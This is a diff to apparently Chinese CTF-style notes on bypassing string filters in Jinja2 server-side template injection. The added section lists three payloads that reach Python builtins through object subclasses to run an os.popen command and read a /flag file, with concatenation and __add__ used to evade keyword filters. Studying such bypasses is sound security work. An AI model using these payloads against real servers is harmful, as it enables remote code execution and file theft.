@@ -599,8 +599,14 @@ dict.setdefault(key, default=None)
 `"__ssalc__"[::-1]`
 
 实际上我发现其实加号是多余的，在jinjia2里面，`"cla""ss"`是等同于`"class"`的，也就是说我们可以这样引用class，并且绕过字符串过滤
+**3、通过\_\_add\_\_**
 
-**3、ascii转换**
+```python
+{{''.__class__.__mro__[1].__subclasses__()[75].__init__.__globals__['__buil'+'tins__']['ev'+'al']('__imp'+'ort__("o'+'s").pop'+'en("ls").read()')}}
+{{[].__class__.__base__.__subclasses__()[75].__init__.__globals__.__builtins__["open"]("/fl""ag").read()}}
+{{app.__init__.__globals__["__buil".__add__("tins__")].open("/fla".__add__("g")).read()}}
+```
+**4、ascii转换**
 
 ```python
 1.
